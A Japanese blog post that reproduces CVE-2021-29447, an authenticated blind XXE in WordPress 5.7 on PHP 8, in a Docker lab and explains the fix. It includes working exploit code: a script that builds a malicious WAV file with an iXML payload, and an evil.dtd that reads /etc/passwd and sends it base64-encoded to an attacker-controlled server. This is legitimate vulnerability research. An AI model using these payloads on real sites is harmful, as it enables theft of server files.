<div style="text-align:center;">[f:id:motikan2010:20210418213822p:plain]</div>

<div class="contents-box" style="width:50%;"><p>[:contents]</p></div>

## はじめに

　2021年4月15日に WordPress 5.7.1 がリリースされ、脆弱性が2つ修正されました。

[https://wordpress.org/news/2021/04/wordpress-5-7-1-security-and-maintenance-release/:embed:cite]

　その中の1つであるXXEの脆弱性(CVE-2021-29447) を検証していきます。  
<span class="m-y">具体的には『Blind XXE』を使ってターゲットとなるWordPressサイトにからで `/etc/passwd`ファイルの中身を取得します。</span>  

[f:id:motikan2010:20210417214606p:plain:w700]

　悪意あるXMLコードを含んだWAVファイル(.wav)をアップロードすることで脆弱性を悪用できますが、メディアをアップロードできるロールは以下の通りです。  

　<span class="m-y">「投稿者 (Author)」以上のロールのアカウントがこの脆弱性を利用できます。</span>

| ロール | メディアのアップロード |
| - | - |
| 購読者 (Subscriber) | できない |
| 寄稿者 (Contributor) | できない |
| 投稿者 (Author) | **できる** |
| 編集者 (Editor) | **できる** |
| 管理者 (Administrator) |  **できる** |

### 脆弱性の修正内容

　脆弱性の修正コミットはこちらです。  
[https://github.com/WordPress/WordPress/commit/c29db9c1e397d3a230017fe0dd007eed0fd488e1:title]

[f:id:motikan2010:20210418210959p:plain:alt=脆弱性の修正内容:w700]  

　PHP のバージョンが8以上でも `libxml_disable_entity_loader(true)`関数 を呼び出すように修正されています。

## 脆弱性の検証

　検証環境は以下の通りです。

　ホストPCの各ソフトウェアのバージョンは記載しているもの以外でも動作すると思います。  

- ホストPC
  - Mac OS
  - Docker 20.10.5 → WordPress を動作に使う
  - PHP 7.3.21 → 攻撃者Webサーバを動作に使う
  - npm 7.7.0 → 攻撃用WAVファイルを生成に使う
- WordPress Docker 環境
  - WordPress 5.7
  - PHP 8

　下のリポジトリ内のコードを用いて脆弱性の検証を行っていきます。

[https://github.com/motikan2010/CVE-2021-29447:embed:cite]

###  WordPressの起動

　Dockerで攻撃対象となる WordPress を起動します。WordPressのバージョンは 5.7 です。  
そして初期設定としてサイト名や管理者アカウント情報などを設定します。

<div class="md-code" style="width:100%">
```
$ make up-wp
docker-compose up
Creating network "cve-2021-29447_default" with the default driver
Creating cve-2021-29447_db_1 ... done
Creating cve-2021-29447_wordpress_1 ... done
Attaching to cve-2021-29447_db_1, cve-2021-29447_wordpress_1
```
</div>

### アカウントの確認

　検証で使用するアカウントを作成します。

　メディアをアップロードできるロールの中で一番権限の弱い「投稿者 (Author)」アカウントを作成します。  

[f:id:motikan2010:20210417214748p:plain:w700]

### 攻撃用WAVファイルの生成

　iXML チャンク部分に攻撃コードを含んだ WAVファイル(.wav) を作成していきます。  

　iXML チャンクを操作するために `wavefile` というnpmライブラリを使いました。  

[https://github.com/rochars/wavefile#xml-chunks:embed:cite]

　WAVファイルを生成するコードは下のようになっています。

　`setiXML`関数の引数に iXML チャンクの内容を記述します。攻撃者Webサーバの DTDファイルを取得するXMLを定義しています。

<div class="md-code" style="width:100%">
```javascript
const fs = require('fs');
const wavefile = require('wavefile');

let wav = new wavefile.WaveFile();
wav.fromScratch(1, 44100, '32', [0, -2147483, 2147483, 4]);
wav.setiXML('<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM \'http://host.docker.internal:8001/evil.dtd\'>%remote;%init;%trick;]>');
fs.writeFileSync('malicious.wav', wav.toBuffer());
```
</div>

　作成した`malicious.wav`に攻撃コードが含まれていることが確認できます。
[f:id:motikan2010:20210417214815p:plain:alt=WAVファイルの生成:w700]

　ちなみに iXML チャンクの説明は以下の通り。ファイルのメタデータを格納する領域とのこと。

> iXML チャンクを挿入 (Insert iXML Chunk)  
> プロジェクト名、作成者、フレームレートなどのプロジェクト関連の付加的な情報を追加します。

[https://steinberg.help/cubase_pro_artist/v9/ja/cubase_nuendo/topics/export_audio_mixdown/export_audio_mixdown_file_format_wave_files_r.html:embed:cite]

### 攻撃者Webサーバを起動

　攻撃者Webサーバを起動します。  
本来ではインターネット上で動作させて攻撃対象WordPressからリクエストを受け付けますが、検証ではホストPC上で動作させています。  

[f:id:motikan2010:20210417215029p:plain:alt=攻撃者Webサーバを起動:w600]

　コンテナ内からホストPCにアクセスするためには `host.docker.internal` ドメインを使用します。

<div class="md-code" style="width:100%">
```
# curl http://host.docker.internal:8001/evil.dtd -v

> GET /evil.dtd HTTP/1.1
> Host: host.docker.internal:8001
> User-Agent: curl/7.64.0
> Accept: */*
>
< HTTP/1.1 200 OK
< Host: host.docker.internal:8001
< Date: Sun, 18 Apr 2021 02:12:22 GMT
< Connection: close
< Content-Type: application/xml-dtd
< Content-Length: 193
<
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY &#37; trick SYSTEM 'http://host.docker.internal:8001/?p=%file;'>" >
```
</div>

### WAVファイルのアップロード

　 WordPressの管理画面にログインし、先ほど生成したWAVファイルをアップロードします。

　投稿者ロールのアカウントであるため、管理者ロールと比べてできることが少ないですがメディアのアップロードは可能です。  

[f:id:motikan2010:20210417214913p:plain:alt=WAVファイルのアップロード:w700]

　WAVファイルをアップロードした瞬間に攻撃者Webサーバへ攻撃対象WordPressからアクセスがあります。

### 攻撃者Webサーバのログを確認

　アクセスログから `evil.dtd` と `謎のBase64文字列` へのアクセスが確認できます。

[f:id:motikan2010:20210417214819p:plain:alt=攻撃者Webサーバのログ:w700]

　赤枠で囲っている部分が `/etc/passwd`ファイルの内容です。圧縮&エンコードされているので今は読めませんが...。

### ログから取得した文字列の解凍

　ファイル内容は `zlibで圧縮後、Base64エンコード` されているため、そのまま読むことはできませんが `Base64デコード後、zlibで解凍` することで読むことができるようになります。

[f:id:motikan2010:20210417214904p:plain:alt=取得した文字列の解凍:w700]

[f:id:motikan2010:20210417214908p:plain:alt=ファイル内容を確認:w700]

　取得するデータを圧縮する工夫をしていますが `/var/www/html/wp-config.php` ファイルはサイズの問題なのか取得することができませんでした...。
[https://www.synacktiv.com/ressources/synacktiv_drupal_xxe_services.pdf#page=11]  

## まとめ

　以上が脆弱性の検証でした。  

　脆弱性が発生した理由は PHP 8以上時には、`libxml_disable_entity_loader`関数を呼び出していことがありました。

<figure class="figure-image figure-image-fotolife" title="脆弱性の修正内容">[f:id:motikan2010:20210418210959p:plain:alt=脆弱性の修正内容:w600]<figcaption>脆弱性の修正内容</figcaption></figure>

　ドキュメントの方には `この関数は PHP 8.0.0 で 非推奨になります。` と記載があります。

しかし、下記のような記載があるので今回の場合は libxml_disable_entity_loader関数 を使う必要がようです。

> libxml 2.9.0 以降では、エンティティの置換はデフォルトで無効になっているため、 LIBXML_NOENT を使って内部エンティティの参照を解決する必要がない限り、 外部エンティティの読み込みを無効にする必要はありません。 

<figure class="figure-image figure-image-fotolife" title="libxml_disable_entity_loader 関数の説明">[f:id:motikan2010:20210418211607p:plain:w600]<figcaption>libxml_disable_entity_loader 関数の説明</figcaption></figure>


[https://www.php.net/manual/ja/function.libxml-disable-entity-loader.php:title]

　昨今では libxml 2.9.0 のように、デフォルトが安全な方になっていてセキュリティ面で意識しなくても良いようになってきていますが、特定の条件下(今回の場合は`LIBXML_NOENT`を引数に渡している)では脆弱になるということに注意する必要があると思った次第です。

## 参考

- [NVD - CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)
- [WordPress 5.6-5.7 - Authenticated XXE Within the Media Library Affecting PHP 8 Security Vulnerability](https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5)
- XXE
  - [XXE 応用編 | MBSD Blog](https://www.mbsd.jp/blog/20171213.html)
  - [XXE 指北 - Tr0y's Blog](https://www.tr0y.wang/2019/05/03/XXE%E6%8C%87%E5%8C%97/)
- WAVファイル
  - [Broadcast Wave Format - Wikipedia](https://ja.wikipedia.org/wiki/Broadcast_Wave_Format)


## 更新履歴

- 2021年4月23日 「MAVファイル」を「WAVファイル」に修正
- 2021年4月18日 新規作成
